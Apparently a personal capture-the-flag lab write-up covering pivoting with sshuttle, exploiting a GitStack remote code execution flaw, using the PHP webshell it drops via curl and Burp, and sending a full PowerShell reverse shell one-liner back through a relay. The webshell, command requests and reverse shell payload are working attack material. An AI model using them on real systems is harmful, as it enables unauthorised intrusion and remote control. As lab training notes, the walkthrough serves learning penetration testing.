
See [[03 - enumeration 02]]

---

We can use sshuttle to create a tunnel to our next target @ **10.200.84.150:80**

`sshuttle -r root@10.200.84.200 --ssh-cmd "ssh -i id_rsa" 10.200.84.0/24`

We can now access http://10.200.84.150

This page reveals that it is running **gitstack**

___

We search in exploit db for gitstack and find the following RCE:

https://www.exploit-db.com/exploits/43777

We can copy this exploit to our machine
`searchsploit -m 43777`

**A common issue with exploit db scripts are the line endings. They need to be converted to unix line endings**

`dos2unix ./43777.py`

---

You can edit the **command** field in the script to send a reverse shell. But if we look closer at the last 6 lines of code...

We see it creates a PHP webshell 
```php
<?php system($_POST['a']); ?>
```

and echos it into a file called **exploit.php** under the webroot.
This can be access by posting a command to the newly created /web/exploit.php file

We can exploit this via cURL:

`curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"`

Or through burpsuite by using repeater. Here is an example:

```post
POST /web/exploit-k.php HTTP/1.1
Host: gitserver.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=8fIXpM3hjzaS9K5qdiztvTjrY2CW2DFA; sessionid=7c7f16ab0abe63010d960ed76f54b6e8
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

a=whoami
```

Let's try to ping to our machine to see if we can send outbound traffic

Set up  tcpdump on our box
`tcpdump -i tun0 icmp`
Try to ping it from the box
`ping -n 3 ATTACKING_IP`

Nothing gets sent. Now we have two options.

-   Given we have a fully stable shell on .200, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) and just catch the shell here
-   We could set up a relay on .200 to forward a shell back to a listener

---

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:  
`firewall-cmd --zone=public --add-port PORT/tcp`  
Substituting in your desired choice of port.

In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).

---

Now we set up our reverse shell relay

[[Reverse Shell Relay]]

We then send this to the a= command in burpsuite. Replacing IP with 10.200.84.200 and PORT with the port we opened on .200

```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


Proceed to [[Foothold 02]]
